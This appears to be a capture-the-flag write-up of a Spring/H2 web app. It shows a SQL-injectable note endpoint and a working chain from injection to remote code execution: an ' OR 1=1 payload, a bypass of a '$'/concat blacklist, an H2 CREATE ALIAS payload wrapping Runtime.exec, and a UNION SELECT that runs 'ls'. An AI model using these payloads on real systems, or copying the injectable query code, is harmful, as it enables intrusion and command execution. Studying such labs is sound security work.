# Pentest Notes

## Solutions
```sql
INSERT INTO users (id, username,password) VALUES (1, 'user', '123');
```
We can login using default user account
```java
    @PostMapping("/note")
    public ResponseEntity < ? > noteByName(@RequestParam String name, HttpSession httpSession) {
        if (httpSession.getAttribute("username") == null) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("unauthorized");
        }
        if (name.contains("$") || name.toLowerCase().contains("concat")) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("Bad character in name :)");
        }
        String query = String.format("Select * from notes where name ='%s' ", name);
        List < Object[] > resultList = entityManager.createNativeQuery(query).getResultList();
        List < Map < String, Object >> result = new ArrayList < > ();
        for (Object[] row: resultList) {
            Map < String, Object > rowMap = new HashMap < > ();
            rowMap.put("ID", row[0]);
            rowMap.put("Name", row[1]);
            rowMap.put("Note", row[2]);
            result.add(rowMap);
        }
        return ResponseEntity.ok(result);
    }
```
First glance at the note function, we can see that there is no restriction for name parameter. And after i put a ' OR 1=1; in the payload, it return all the notes. So that it is a SQLi, and we need somehow to chain this to RCE so that we can read the flag.
After searching around, i saw a interesting [writeup](https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2).

So for short, H2 database allows us to create a function that execute Java code through ALIAS
```sql
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;
```
So here is our function but there are some conditions.
```java
        if (httpSession.getAttribute("username") == null) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("unauthorized");
        }
        if (name.contains("$") || name.toLowerCase().contains("concat")) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("Bad character in name :)");
        }
```
We cannot use `$` or the `CONCAT` function. Fortunately, we can bypass this restriction since the `CREATE ALIAS` expects a String, so we don't need to use `$`.
So out payload would be 
```sql
'CREATE ALIAS EXECVE AS 'String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }';--
```
After injecting this function to the database,what we need now is just call out the function.
```sql
' UNION SELECT NULL,NULL,EXECVE('ls') AS note;--
```
We need to 2 first null so that it can match the collumns

![Executin](https://example.com/sql-injection-example.png)


